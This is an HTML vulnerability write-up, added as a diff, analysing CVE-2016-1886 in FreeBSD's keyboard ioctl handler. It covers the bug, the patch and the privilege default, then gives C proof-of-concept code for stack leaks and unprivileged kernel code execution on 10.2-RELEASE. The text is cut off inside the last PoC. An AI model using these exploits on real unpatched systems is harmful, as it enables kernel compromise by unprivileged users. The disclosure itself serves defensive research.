@@ -1,0 +1,940 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+		<meta charset="UTF-8">
+		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
+		<link rel="stylesheet" type="text/css" href="css/core.css" />
+		<title>Analysis of CVE-2016-1886, SETFKEY FreeBSD kernel vulnerability</title>
+	</head>
+	
+	<body>
+		<div class="page">
+			<div class="container">
+				<div class="header">
+					<a href="contact.html" class="header-element">
+						Contact
+					</a>
+					
+					<a href="about.html" class="header-element">
+						About
+					</a>
+					
+					<a href="articles.html" class="header-element">
+						Articles
+					</a>
+					
+					<a href="index.html" class="header-element">
+						Home
+					</a>
+				</div>
+				
+				<h1>Analysis of CVE-2016-1886, <code>SETFKEY</code> FreeBSD kernel vulnerability</h1>
+				<hr>
+
+				<h2>Introduction</h2>
+				<p>
+					Every FreeBSD keyboard driver exposes its own <code>ioctl</code> interface to allow it to be configured from userland (through the <code><a href="https://www.freebsd.org/cgi/man.cgi?query=kbdcontrol&amp;apropos=0&amp;sektion=1&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html">kbdcontrol</a></code> utility for example). Typically, these <code>ioctl</code> handlers will implement any specific commands for the hardware, such as <a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/dev/atkbdc/atkbd.c#L898">enabling or disabling LEDs</a>, and will <a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/dev/atkbdc/atkbd.c#L981">delegate the rest of the commands to a common handler</a>, called <code>genkbd_commonioctl</code>.
+				</p>
+
+				<p>
+					I discovered a vulnerability in this common handler, which has been present since <a href="https://github.com/freebsd/freebsd/commit/f10c5df4354e9dcf241989c9490f57fcd2ced1fc#diff-098700524e1f7ee46a26bd3432ee17a4R885">the driver's introduction in 1999</a>.
+				</p>
+				
+				<p>
+					Due to a poor default <code>sysctl</code> variable, this bug can be triggered by an unprivileged user, so long as at least one keyboard driver is running (by default the <code><a href="https://www.freebsd.org/cgi/man.cgi?query=atkbd&amp;apropos=0&amp;sektion=4&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html">atkbd</a></code> driver is used), making its impact critical.
+				</p>
+				
+				<p>
+					I decided to report this bug to the <a href="https://www.freebsd.org/security/reporting.html">FreeBSD Security Team</a> on April 22, 2016, the day after I had discovered it, and was able to exploit it about a week later. It has been assigned <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1886">CVE-2016-1886</a> and <a href="https://www.freebsd.org/security/advisories/FreeBSD-SA-16:18.atkbd.asc">Security Advisory 16:18</a>.
+				</p>
+				
+				<p>
+					In this article I will provide an explanation of the bug, and some of the methods which I considered for exploitation, including the one I had success with: using the corrupted <code>len</code> member of a <code>keytab</code> to trigger a powerful two way heap and stack overflow.
+				</p>
+				
+				<p>
+					As always, since my interest is just in finding and analysing bugs, and not in publishing any fully weaponised exploit source code, the aim of this article will just be to demonstrate the impact of the bug by gaining kernel code execution as an unprivileged user; I will leave any further development, such as privilege escalation and cleanly returning from the payload, as an exercise for the reader.
+				</p>
+				
+				<p>
+					All details and code excerpts for this article have been taken from FreeBSD 10.2-RELEASE (amd64), however, the vulnerability is present up to version 10.3 as well, and for all architectures supported by FreeBSD.
+				</p>
+				
+				<br>
+
+				<h2>Background</h2>
+				<p>
+					The <code><a href="https://www.freebsd.org/cgi/man.cgi?query=keyboard&amp;apropos=0&amp;sektion=4&amp;manpath=FreeBSD+10.2-RELEASE&amp;arch=default&amp;format=html">keyboard</a></code> kernel struct contains a pointer to an array of tables, which are used to describe the function of a particular key. This array is allocated on the heap, with <code>16</code> bytes reserved for each description.
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/sys/kbio.h#L103">sys/sys/kbio.h</a></code>:
+				</p>
+
+				<pre><code>#define MAXFK           16</code></pre>
+
+				<br>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/dev/kbd/kbdreg.h#L52">sys/dev/kbd/kbdreg.h</a></code>:
+				</p>
+
+				<pre><code>typedef struct keyboard keyboard_t;
+
+...
+
+struct keyboard {
+	...
+	struct fkeytab	*kb_fkeytab;	/* function key strings */
+	int		kb_fkeytab_size;/* # of function key strings */
+	...
+};</code></pre>
+
+				<br>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/sys/kbio.h#L218">sys/sys/kbio.h</a></code>:
+				</p>
+
+				<pre><code>struct fkeytab {
+	u_char		str[MAXFK];
+	u_char		len;
+};</code></pre>
+
+				<br>
+				
+				<p>
+					The <code>genkbd_commonioctl</code> handler exposes the <code>GETFKEY</code> and <code>SETFKEY</code> commands to manage the description of these function keys from userland.
+				</p>
+				
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/dev/kbd/kbd.c#L837">sys/dev/kbd/kbd.c</a></code>:
+				</p>
+
+				<pre><code>int
+genkbd_commonioctl(keyboard_t *kbd, u_long cmd, caddr_t arg)
+{
+	keymap_t *mapp;
+	okeymap_t *omapp;
+	keyarg_t *keyp;
+	fkeyarg_t *fkeyp;
+	int s;
+	int i, j;
+	int error;
+
+	s = spltty();
+	switch (cmd) {
+	
+	...
+	
+	case GETFKEY:		/* get functionkey string */
+		fkeyp = (fkeyarg_t *)arg;
+		if (fkeyp->keynum >= kbd->kb_fkeytab_size) {
+			splx(s);
+			return (EINVAL);
+		}
+		bcopy(kbd->kb_fkeytab[fkeyp->keynum].str, fkeyp->keydef,
+		    kbd->kb_fkeytab[fkeyp->keynum].len);
+		fkeyp->flen = kbd->kb_fkeytab[fkeyp->keynum].len;
+		break;
+	case SETFKEY:		/* set functionkey string */
+#ifndef KBD_DISABLE_KEYMAP_LOAD
+		fkeyp = (fkeyarg_t *)arg;
+		if (fkeyp->keynum >= kbd->kb_fkeytab_size) {
+			splx(s);
+			return (EINVAL);
+		}
+		error = fkey_change_ok(&amp;kbd->kb_fkeytab[fkeyp->keynum],
+		    fkeyp, curthread);
+		if (error != 0) {
+			splx(s);
+			return (error);
+		}
+		kbd->kb_fkeytab[fkeyp->keynum].len = imin(fkeyp->flen, MAXFK);
+		bcopy(fkeyp->keydef, kbd->kb_fkeytab[fkeyp->keynum].str,
+		    kbd->kb_fkeytab[fkeyp->keynum].len);
+		break;
+#else
+		splx(s);
+		return (ENODEV);
+#endif
+
+	default:
+		splx(s);
+		return (ENOIOCTL);
+	}
+
+	splx(s);
+	return (0);
+}</code></pre>
+
+				<br>
+				
+				<p>
+					For these commands, the <code>fkeyp</code> struct is user supplied, and of type <code>struct fkeyarg</code>.
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/sys/kbio.h#L224">sys/sys/kbio.h</a></code>:
+				</p>
+
+				<pre><code>struct fkeyarg {
+    u_short         keynum;
+    char            keydef[MAXFK];
+    char            flen;
+};
+typedef struct fkeyarg  fkeyarg_t;</code></pre>
+
+				<br>
+				
+				<h2>Privilege requirement</h2>
+				<p>
+					As mentioned earlier, there is a <code>sysctl</code> variable, <code>hw.kbd.keymap_restrict_change</code>, which prevents unprivileged users from updating the length or contents of these keymap entries (checked by <code>fkey_change_ok</code>), however it is set to a default value of <code>0</code>, which disables this functionality!
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/dev/kbd/kbd.c#L85">sys/dev/kbd/kbd.c</a></code>:
+				</p>
+
+				<pre><code>SYSCTL_INT(_hw_kbd, OID_AUTO, keymap_restrict_change, CTLFLAG_RW,
+    &amp;keymap_restrict_change, 0, "restrict ability to change keymap");
+
+...
+
+static int
+fkey_change_ok(fkeytab_t *oldkey, fkeyarg_t *newkey, struct thread *td)
+{
+	if (keymap_restrict_change &lt;= 3)
+		return (0);
+
+	if (oldkey->len != newkey->flen ||
+	    bcmp(oldkey->str, newkey->keydef, oldkey->len) != 0)
+		return priv_check(td, PRIV_KEYBOARD);
+
+	return (0);
+}</code></pre>
+
+				<br>
+
+				<p>
+					I'm not sure if this is a bug in its self, or if FreeBSD just has poor defaults, but we decided to raise the default value of this <code>sysctl</code> to be <code>4</code> in HardenedBSD; perhaps FreeBSD will follow suit.
+				</p>
+
+				<p>
+					The functionality to modify keymap entries can also be removed entirely by compiling with "<code>options KBD_DISABLE_KEYMAP_LOAD</code>" in the <a href="https://www.freebsd.org/doc/handbook/kernelconfig-config.html">configuration file</a>, but this option is not present in the GENERIC kernel.
+				</p>
+				
+				<br>
+				
+				<h2>The bug</h2>
+				<p>
+					The bug is an improper bound check when updating the length of a key description through the <code>SETFKEY</code> command.
+				</p>
+				
+				<p>
+					Obviously, before accepting a user supplied length here, it should be checked to ensure that any copies relying on it won't write out of bounds for the allocated buffer (<code>MAXFK = 16 bytes</code>).
+				</p>
+				
+				<p>
+					The handler attempts to do this by using <code>imin</code> to provide an upper limit of <code>MAXFK</code>. The problem is that no part of this code checks for negative values of <code>fkeyp->flen</code>!
+				</p>
+				
+				<pre><code>kbd->kb_fkeytab[fkeyp->keynum].len = imin(fkeyp->flen, MAXFK);</code></pre>
+				
+				<br>
+				
+				<p>
+					When passing a negative length in <code>fkeyp->flen</code>, a <code>signed</code> comparison will be performed against <code>16</code>, which results in <code>imin</code> returning the negative length.
+				</p>
+				
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/sys/libkern.h#L57">sys/sys/libkern.h</a></code>:
+				</p>
+
+				<pre><code>static __inline int imin(int a, int b) { return (a &lt; b ? a : b); }</code></pre>
+
+				<br>
+
+				<p>
+					The negative value returned by <code>imin</code> is then assigned to <code>kbd->kb_fkeytab[fkeyp->keynum].len</code>, which has an <code>unsigned</code> type (<code>u_char</code>). This means that negative lengths will wrap around to be positive; for example, <code>-1</code> will wrap around to <code>255</code>.
+				</p>
+				
+				<p>
+					Triggering the vulnerability only requires our copy size to be negative as a <code>signed char</code>, which means we may choose any values between <code>128 - 255</code>.
+				</p>
+				
+				<br>
+				
+				<h2>Patch</h2>
+				<p>
+					I submitted a patch alongside my report which solves the issue by replacing <code>imin</code> with <code>min</code> in the <code>SETFKEY</code> case of <code>genkbd_commonioctl</code>.
+				</p>
+				
+				<p>
+					This function performs <code>unsigned</code> comparisons instead, and so will return <code>MAXFK</code> when compared against a negative value.
+				</p>
+				
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/sys/libkern.h#L61">sys/sys/libkern.h</a></code>:
+				</p>
+
+				<pre><code>static __inline u_int min(u_int a, u_int b) { return (a &lt; b ? a : b); }</code></pre>
+
+				<br>
+				
+				<p>
+					The official patch may be downloaded from the <a href="https://security.FreeBSD.org/patches/SA-16:18/atkbd.patch">FreeBSD site</a>.
+				</p>
+				
+				<br>
+				
+				<h2><code>ioctl</code></h2>
+				<p>
+					Before going over the resultant overflows which occur from an invalid length being set, let's take a look at how the <code>ioctl</code> system call prepares the argument buffer.
+				</p>
+				
+				<p>
+					This buffer will either be allocated on the heap with <code>malloc</code>, or point to a local stack buffer called <code>smalldata</code>, depending on whether the size needed for the command is greater than <code>SYS_IOCTL_SMALL_SIZE</code> (<a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/sys_generic.c#L89"><code>128</code> bytes</a>) or not.
+				</p>
+
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/kern/sys_generic.c#L660">sys/kern/sys_generic.c</a></code>:
+				</p>
+
+				<pre><code>int
+sys_ioctl(struct thread *td, struct ioctl_args *uap)
+{
+	u_char smalldata[SYS_IOCTL_SMALL_SIZE] __aligned(SYS_IOCTL_SMALL_ALIGN);
+	u_long com;
+	int arg, error;
+	u_int size;
+	caddr_t data;
+
+	...
+
+	/*
+	 * Interpret high order word to find amount of data to be
+	 * copied to/from the user's address space.
+	 */
+	size = IOCPARM_LEN(com);
+	
+	...
+
+	if (size > 0) {
+		if (com &amp; IOC_VOID) {
+			/* Integer argument. */
+			arg = (intptr_t)uap->data;
+			data = (void *)&amp;arg;
+			size = 0;
+		} else {
+			if (size > SYS_IOCTL_SMALL_SIZE)
+				data = malloc((u_long)size, M_IOCTLOPS, M_WAITOK);
+			else
+				data = smalldata;
+		}
+	} else
+		data = (void *)&amp;uap->data;
+	if (com &amp; IOC_IN) {
+		error = copyin(uap->data, data, (u_int)size);
+		if (error != 0)
+			goto out;
+	} else if (com &amp; IOC_OUT) {
+		/*
+		 * Zero the buffer so the user always
+		 * gets back something deterministic.
+		 */
+		bzero(data, size);
+	}
+
+	error = kern_ioctl(td, uap->fd, com, data);
+
+	if (error == 0 &amp;&amp; (com &amp; IOC_OUT))
+		error = copyout(data, uap->data, (u_int)size);
+
+out:
+	if (size > SYS_IOCTL_SMALL_SIZE)
+		free(data, M_IOCTLOPS);
+	return (error);
+}</code></pre>
+
+				<br>
+				
+				<p>
+					Both the <code>GETFKEY</code> and <code>SETFKEY</code> commands take an argument of type <code>fkeyarg_t</code>, which is <code>20</code> bytes, so the <code>128</code> byte stack buffer, <code>smalldata</code>, will be used.
+				</p>
+				
+				<br>
+				
+				<h2><code>SETFKEY</code> overflow</h2>
+				<p>
+					Immediately after setting the new length in <code>SETFKEY</code>, a <code>bcopy</code> will be performed from the user supplied <code>keydef</code> in the <code>ioctl</code> argument buffer on the stack, into the key description heap array.
+				</p>
+				
+				<pre><code>bcopy(fkeyp->keydef, kbd->kb_fkeytab[fkeyp->keynum].str,
+	kbd->kb_fkeytab[fkeyp->keynum].len);</code></pre>
+				
+				<br>
+				
+				<p>
+					Once again, the size of the argument buffer on the stack is <code>128</code> bytes, each description of a <code>keydef</code> is <code>16</code> bytes, and the copy size we can control to be within the range <code>128 - 255</code>.
+				</p>
+				
+				<br>
+				
+				<h2><code>GETFKEY</code> overflow</h2>
+				<p>
+					Once the corrupted size has been set, we can perform the inverse copy, from the key description heap array into the <code>ioctl</code> argument buffer on the stack, through the <code>GETFKEY</code> command.
+				</p>
+				
+				<p>
+					<code><a href="https://github.com/freebsd/freebsd/blob/release/10.2.0/sys/dev/kbd/kbd.c#L976">sys/dev/kbd/kbd.c</a></code>:
+				</p>
+
+				<pre><code>bcopy(kbd->kb_fkeytab[fkeyp->keynum].str, fkeyp->keydef,
+	kbd->kb_fkeytab[fkeyp->keynum].len);</code></pre>
+				
+				<br>
+				
+				<h2>Targets for heap overflow</h2>
+				<p>
+					There are two main targets for the heap overflow, depending on the value specified for <code>fkeyp->keynum</code>.
+				</p>
+
+				<p>
+					If <code>0</code> is specified, the copy will start from the first <code>struct fkeytab</code> in the array, and read from or write into the elements following it (depending on the command).
+				<p>
+
+				<p>
+					Alternatively, we can begin the copy from the final element of the array by specifying <code>(kbd->kb_fkeytab_size - 1 = 95)</code>, which will result in overflowing whatever data on the heap follows the <code>kbd->kb_fkeytab</code> allocation.
+				<p>
+				
+				<p>
+					Unfortunately, since each keyboard driver will allocate this buffer as soon as it is loaded, which is presumably at boot, we have no control over what the adjacent memory allocations will be.
+				</p>
+
+				<p>
+					All we know is that the size requested for this allocation will be <code>1920</code> bytes (<code>sizeof(struct fkeytab) * 96</code>), and so it will be allocated on the <code>2048</code> byte anonymous zone (check out <a href="http://argp.github.io/">argp</a>'s paper about <a href="http://phrack.org/issues/66/8.html">exploiting UMA</a> for a detailed description of how UMA works).
+				</p>
+
+				<p>
+					Because of this, the actual size of the buffer allocated for the <code>kb_fkeytab</code> member is <code>2048</code> bytes, which means that by copying from the final element in this array with a size of <code>255</code> bytes, we overflow the next heap allocation by <code>107</code> bytes (<code>1920 - 20 + 255 - 2048</code>).
+				</p>
+
+				<p>
+					To identify whether overflowing into this memory would be useful, I set a breakpoint on the <code>bcopy</code> call to find the address of the <code>kb_keytab</code> buffer, and then dumped and set read/write breakpoints on the memory following it. Unfortunately the breakpoints were never triggered, and the contents of the dump were only <code>0</code> bytes, so it didn't seem to be used for anything.
+				</p>
+				
+				<p>
+					This means that our only choice when overflowing from and into the heap is to to target other <code>struct fkeytab</code> items.
+				</p>
+				
+				<br>
+				
+				<h2>Targets for stack overflow</h2>
+				<h3>The argument buffer</h3>
+				<p>
+					As we saw earlier, the <code>ioctl</code> system call is designed to only copy in as much data from the user as a particular command expects, and so by the time that the <code>SETFKEY</code> heap overflow occurs, we have only copied <code>sizeof(struct fkeyarg)</code> into the argument buffer, without any control over the data following it. Because of this, we can't directly control the contents of the overflow from our <code>SETFKEY</code> call.
+				</p>
+				
+				<p>
+					However, you may have noticed that only the portion of the argument buffer which is expected to be used will be initialised with data (via the <code>copyin</code> call when used as an input, and via the <code>bzero</code> call when used as an output).
+				</p>
+
+				<p>
+					This means that the initial overflow contents will be whatever uninitialised stack data is in the rest of <code>smalldata</code>. We can use this to our advantage by performing various other system calls beforehand, which will write to the stack, to gain some control over the memory which will later be occupied by <code>smalldata</code>.
+				</p>
+
+				<p>
+					For example, we can perform an <code>ioctl</code> call which takes a larger input (but at most <code>128</code> bytes) to copy arbitrary contents into the <code>smalldata</code> buffer, and then trigger the <code>SETFKEY</code> vulnerability. Since the stack frame for the two <code>ioctl</code> calls will be the same size (both will go through <code>Xfast_syscall -> amd64_syscall -> sys_ioctl</code>), the <code>smalldata</code> buffer will occupy the same stack memory for both calls. As long as nothing else writes to this memory between the two calls, the <code>smalldata</code> buffer used for the <code>SETFKEY</code> command will still contain the contents from the first <code>ioctl</code> call.
+				</p>
+				
+				<p>
+					There are many suitable <code>ioctl</code> commands to use for this: <code>SIOCSIFPHYADDR</code>, <code>OSIOCAIFADDR</code>, <code>SIOCSDRVSPEC</code>, <code>SIOCAIFGROUP</code>, etc.
+				</p>
+				
+				<p>
+					I had partial success with this technique: most of the bytes from the first <code>ioctl</code> call remained in the buffer by the time the second call was reached, but some were overwritten with garbage data. You may be able to get better results from using other system calls, but I didn't analyse this possibility fully.
+				</p>
+				
+				<p>
+					Below is some PoC code to demonstrate overflowing into a <code>keytab</code> with controlled contents:
+				</p>
+				
+				<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stddef.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/kbio.h&gt;
+#include &lt;sys/consio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;net/if.h&gt;
+
+int main(void) {
+	int i;
+	fkeyarg_t fkey;
+	
+	
+	printf("  [+] Fill final keytab data with 'a'\n");
+	fkey.keynum = 95;
+	fkey.flen = 16;
+	memset(&amp;fkey.keydef, 'a', 16);
+	ioctl(0, SETFKEY, &amp;fkey);
+	
+	printf("  [+] Get final keytab data\n");
+	fkey.keynum = 95;
+	fkey.flen = 16;
+	memset(&amp;fkey.keydef, 0, 16);
+	ioctl(0, GETFKEY, &amp;fkey);
+	printf("keydef: ");
+	for(i = 0; i < 16; i++) {
+		printf("%02hhx ", fkey.keydef[i]);
+	}
+	printf("\n");
+	printf("flen: %d\n", fkey.flen);
+	
+	
+	printf("  [+] Perform stack data manipulation\n");
+	int sock = socket(AF_INET, SOCK_DGRAM, 0);
+	
+	struct oifaliasreq req;
+	memset(&amp;req, 0, sizeof(req));
+	
+	fkeytab_t *keytab = (fkeytab_t *)((char *)&amp;req + offsetof(fkeyarg_t, keydef));
+	memset(&amp;keytab[1].str, 'b', 16);
+	
+	// Make sure that the length of the corrupted keytab won't cause stack overflow when using GETFKEY command
+	keytab[1].len = 16;
+	
+	ioctl(sock, OSIOCAIFADDR, &amp;req);
+	
+	
+	fkey.keynum = 94;
+	fkey.flen = -1;
+	memset(&amp;fkey.keydef, 0, 16);
+	ioctl(0, SETFKEY, &amp;fkey);
+	printf("  [+] Overflowed into final keytab with uninitialised stack data\n");
+	
+	
+	printf("  [+] Get final keytab data\n");
+	fkey.keynum = 95;
+	fkey.flen = 16;
+	memset(&amp;fkey.keydef, 0, 16);
+	ioctl(0, GETFKEY, &amp;fkey);
+	printf("keydef: ");
+	for(i = 0; i < 16; i++) {
+		printf("%02hhx ", fkey.keydef[i]);
+	}
+	printf("\n");
+	printf("flen: %d\n", fkey.flen);
+	
+	
+	close(sock);
+	
+	return 0;
+}</code></pre>
+				
+				<br>
+				
+				<p>
+					The output of the above is as follows:
+				</p>
+				
+				<pre><code>  [+] Fill final keytab data with 'a'
+  [+] Get final keytab data
+keydef: 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61
+flen: 16
+  [+] Perform stack data manipulation
+  [+] Overflowed into final keytab with uninitialised stack data
+  [+] Get final keytab data
+keydef: 00 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62
+flen: 16</code></pre>
+				
+				<br>
+				
+				<p>
+					By replacing the <code>OSIOCAIFADDR</code> <code>ioctl</code> call with a system call which treats the stack differently, we can leak many types of kernel stack data to userland with this method (kernel pointers can be useful for example). However, if the <code>len</code> member is corrupted to be too high, reading the memory will trigger the stack overflow in <code>GETFKEY</code>.
+				</p>
+				
+				<br>
+				
+				<h3>Stack frame</h3>
+				<p>
+					By corrupting the key description's <code>len</code> value to be anything greater than <code>(128 - offsetof(fkeyarg_t, keydef) = 126)</code>, we will extend the stack overflow past the <code>smalldata</code> buffer into the rest of the stack frame.
+				</p>
+				
+				<p>
+					This allows us to read and write to some of the values on the stack which follow the <code>smalldata</code> buffer, from the <code>keydef</code> heap array.
+				</p>
+				
+				<pre><code>smalldata (128)
+stack guard (8)
+rbx (8)
+r12 (8)
+r13 (8)
+r14 (8)
+r15 (8)
+rbp (8)
+rip (8)</code></pre>
+				
+				<br>
+				
+				<p>
+					The following PoC demonstrates this by leaking the stack guard.
+				</p>
+				
+				<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stddef.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/kbio.h&gt;
+#include &lt;sys/types.h&gt;
+
+int main(void) {
+	int i;
+	uint64_t guard;
+	fkeyarg_t fkey;
+	
+	printf("  [+] Set keydef length\n");
+	fkey.keynum = 7;
+	fkey.flen = 16;
+	memset(&amp;fkey.keydef, 'a', 16);
+	ioctl(0, SETFKEY, &amp;fkey);
+	
+	printf("  [+] Overflow into keytabs\n");
+	fkey.keynum = 0;
+	fkey.flen = 128 - offsetof(fkeyarg_t, keydef) + sizeof(guard);
+	memset(&amp;fkey.keydef, 0, 16);
+	ioctl(0, SETFKEY, &amp;fkey);
+	
+	printf("  [+] Get leaked stack data\n");
+	fkey.keynum = 7;
+	fkey.flen = 16;
+	memset(&amp;fkey.keydef, 0, 16);
+	ioctl(0, GETFKEY, &amp;fkey);
+	
+	printf("keydef: ");
+	for(i = 0; i < 16; i++) {
+		printf("%02hhx ", fkey.keydef[i]);
+	}
+	printf("\n");
+	printf("flen: %d\n", fkey.flen);
+	
+	guard = *(uint64_t *)((char *)&amp;fkey.keydef + 7);
+	printf("  [+] Leaked stack guard: 0x%lx\n", guard);
+	
+	return 0;
+}</code></pre>
+				
+				<br>
+				
+				<p>
+					Our only limitation with this is that, due to some differences between <code>fkeyarg_t</code> and <code>struct fkeytab</code>, we can only fully control <code>17</code> of the <code>20</code> bytes for each description (the <code>16</code> bytes in the <code>keydef</code> member, and <code>1</code> of the struct padding bytes). We can partially control the <code>len</code> member, but the final <code>2</code> bytes we have no control over.
+				</p>
+				
+				<br>
+				
+				<h2>Exploiting</h2>
+				<p>
+					The method of exploitation I went with is as follows:
+				</p>
+				
+				<ul>
+					<li>Use <code>SETFKEY</code> to corrupt the length of a <code>keytab</code> and overflow from the stack onto the heap,</li>
+					<li>Modify any values in the heap data using <code>SETFKEY</code> on higher <code>keytab</code>s,</li>
+					<li>Use <code>GETFKEY</code> to overflow from the heap back onto the stack using the previously set length,</li>
+				</ul>
+				
+				<p>
+					Since the <code>GETFKEY</code> and <code>SETFKEY</code> commands both go through the same stack frame, we only need to change the values on the stack which we want to, and can leave the others, like the stack guard, untouched.
+				</p>
+				
+				<p>
+					By preparing the memory on the heap with <code>SETFKEY</code>, we will gain full control over the majority of the stack frame after performing the final <code>GETFKEY</code> call. However, due to how the memory alignment works out, we can only fully control the lower <code>4</code> bytes of the return address; the upper <code>4</code> bytes will remain as <code>0xffffffff</code>.
+				</p>
+				
+				<p>
+					We could attempt to use the trick described earlier to gain more control over the heap by initialising the argument buffer first, and calling <code>SETFKEY</code> on higher keytabs. However, I instead decided to just jump to a piece of kernel code which derives a function pointer from one of the other registers which we control, to gain full <code>rip</code> control.
+				</p>
+				
+				<p>
+					For example, since we control <code>r15</code>, we could use the following code from <code>uma_zfree_arg</code>:
+				</p>
+				
+				<pre><code>FFFFFFFF80BBF2B3                 mov     rax, [r15+0D8h]
+FFFFFFFF80BBF2BA                 test    rax, rax
+FFFFFFFF80BBF2BD                 jz      short loc_FFFFFFFF80BBF2CE
+FFFFFFFF80BBF2BF                 mov     esi, [r15+10Ch]
+FFFFFFFF80BBF2C6                 mov     rdi, r14
+FFFFFFFF80BBF2C9                 mov     rdx, rbx
+FFFFFFFF80BBF2CC                 call    rax</code></pre>
+				
+				<br>
+				
+				<p>
+					Although, an even better solution is to abuse the density of the <code>x86-64</code> architecture by decoding from unintended offsets to find more convenient instructions. I used <a href="https://github.com/0vercl0k/rp">rp++</a> to find the following gadget:
+				</p>
+				
+				<pre><code>FFFFFFFF808312CD                 jmp     rbp</code></pre>
+				
+				<br>
+				
+				<p>
+					The following PoC demonstrates gaining kernel code execution from the bug on 10.2-RELEASE for amd64:
+				</p>
+				
+				<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stddef.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/kbio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/linker.h&gt;
+
+void (*critical_enter)(void);
+int (*kprintf)(const char *fmt, ...);
+
+void *resolve(char *name) {
+	struct kld_sym_lookup ksym;
+	
+	ksym.version = sizeof(ksym);
+	ksym.symname = name;
+	
+	if(kldsym(0, KLDSYM_LOOKUP, &amp;ksym) < 0) {
+		perror("kldsym");
+		exit(1);
+	}
+	
+	printf("  [+] Resolved %s to %#lx\n", ksym.symname, ksym.symvalue);
+	return (void *)ksym.symvalue;
+}
+
+void payload(void) {
+	critical_enter();
+	kprintf("  [+] Entered kernel payload\n");
+	while(1);
+}
+
+// Copy the stack onto the heap
+void heapOverflow(int index, size_t size) {
+	fkeyarg_t fkey;
+	
+	fkey.keynum = index;
+	fkey.flen = size;
+	memset(&amp;fkey.keydef, 0, 16);
+	
+	ioctl(0, SETFKEY, &amp;fkey);
+}
+
+// Copy the heap onto the stack
+void stackOverflow(int index) {
+	fkeyarg_t fkey;
+	
+	fkey.keynum = index;
+	fkey.flen = 16;
+	memset(&amp;fkey.keydef, 0, 16);
+	
+	ioctl(0, GETFKEY, &amp;fkey);
+}
+
+int main(void) {
+	int i;
+	fkeyarg_t fkey;
+	
+	uint32_t ripLower4 = 0x808312cd; // jmp rbp
+	uint64_t rbp = (uint64_t)payload;
+	
+	
+	critical_enter = resolve("critical_enter");
+	kprintf = resolve("printf");
+	
+	
+	printf("  [+] Set full length for key 10\n");
+	fkey.keynum = 10;
+	fkey.flen = 16;
+	ioctl(0, SETFKEY, &amp;fkey);
+	
+	
+	printf("  [+] Set bad length and perform heap overflow\n");
+	heapOverflow(0, 128 - offsetof(fkeyarg_t, keydef) + 8 + 0x30 + sizeof(ripLower4));
+	
+	
+	printf("  [+] Prepare stack overflow memory\n");
+	fkey.keynum = 10;
+	fkey.flen = 16;
+	ioctl(0, GETFKEY, &amp;fkey);
+	*(uint64_t *)((char *)&amp;fkey.keydef + 4) = rbp;
+	*(uint32_t *)((char *)&amp;fkey.keydef + 12) = ripLower4;
+	ioctl(0, SETFKEY, &amp;fkey);
+	
+	
+	printf("  [+] Trigger stack overflow\n");
+	stackOverflow(0);
+	
+	
+	return 0;
+}</code></pre>
+				
+				<br>
+				
+				<h2>Return to userland</h2>
+				<p>
+					Ideally, we should restore the original kernel stack frame so that our payload will return to <code>amd64_syscall -> Xfast_syscall</code>, where the correct userland registers will be restored, before switching back to user mode.
+				</p>
+				
+				<p>
+					However, since my interest is just in demonstrating the impact of the bug, and not in creating fully weaponised source code, I decided to instead just use <code>swapgs</code> and <code>sysret</code> to return to userland with incorrect registers.
+				</p>
+				
+				<pre><code>__asm__ volatile("swapgs; sysret");</code></pre>
+				
+				<br>
+				
+				<p>
+					This will trigger a segmentation fault and kill the userland process, but by this point we have already executed whatever we want in the kernel, and would just exit anyway.
+				</p>
+				
+				<p>
+					This final PoC demonstrates using kernel code execution to modify a read only <code>sysctl</code> variable, and then reading it from a separate userland process. I've also included code to read the original stack variables, just in case anyone wants to try using them to return from the payload properly.
+				</p>
+				
+				<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stddef.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;sys/kbio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/mman.h&gt;
+#include &lt;sys/param.h&gt;
+#include &lt;sys/linker.h&gt;
+
+int (*kprintf)(const char *fmt, ...);
+char *ostype;
+
+uint64_t originalRip;
+uint64_t originalRbp;
+
+void *resolve(char *name) {
